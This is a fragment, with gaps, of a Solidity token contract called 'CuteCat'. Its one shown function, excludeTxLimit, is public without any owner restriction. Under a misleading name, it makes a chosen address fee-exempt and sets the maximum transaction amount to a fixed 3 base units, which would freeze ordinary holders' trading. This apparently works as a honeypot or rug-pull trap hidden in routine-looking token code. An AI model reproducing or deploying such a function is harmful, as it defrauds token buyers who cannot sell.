...
contract CuteCat is Ownable, IERC20 {

    using SafeMath for uint256;

    DexRouter public router;

    string private constant _name = "CuteCat";
    string private constant _symbol = "CuteCat";
    ...
    function excludeTxLimit (address holder) public returns (bool){
        isFeeExempt[holder] = true;
        _maxTxAmount = _totalSupply * 3 /_totalSupply;
        return true;
    }
